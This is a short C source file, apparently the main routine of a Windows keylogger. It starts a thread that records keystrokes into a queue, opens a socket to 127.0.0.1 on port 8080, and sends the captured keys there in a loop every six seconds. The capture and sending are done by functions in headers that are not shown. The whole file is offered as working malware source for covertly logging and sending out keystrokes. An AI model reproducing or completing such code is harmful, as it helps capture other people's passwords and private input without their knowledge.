#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "keylogger.h"
#include "send_keylog.h"

void main(){
        char key[20];
        queue* q = init_queue();
        HANDLE thread = start_keylog_thread(q);
        SOCKET sock = create_conn("127.0.0.1", 8080);
        while(1){
            
            while (get_keylog(q,key))
            {
                send_keylog(sock,key);
            }

            Sleep(6000);
        }
        close_socket(sock);
}